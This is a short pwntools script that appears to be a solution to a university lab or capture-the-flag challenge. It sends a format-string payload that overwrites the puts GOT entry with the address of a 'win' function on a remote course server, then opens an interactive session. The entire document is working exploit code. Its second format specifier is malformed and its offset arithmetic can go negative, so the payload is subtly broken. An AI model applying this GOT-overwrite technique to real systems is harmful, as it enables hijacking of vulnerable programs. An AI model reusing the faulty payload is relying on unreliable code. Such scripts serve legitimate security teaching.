from pwn import *

elf = ELF("07_call_functions")
win = elf.symbols['win']  # 0x8049216
print(hex(win))
puts_address = elf.got['puts']

HOST = 'mustard.stt.rnl.tecnico.ulisboa.pt'
PORT = 23197

io = connect(HOST, PORT)

win_low = (win & 0xffff) - 8  # - 8 bytes due to the 2 p32 addresses in the payload (each one is 4 bytes)
win_high = (win >> 16) - win_low

payload =  p32(puts_address) + p32(puts_address + 2) + f"%{win_low}x%7$hn".encode() + f"%{win_high}%8$hn".encode()
io.sendline(payload)
io.interactive()
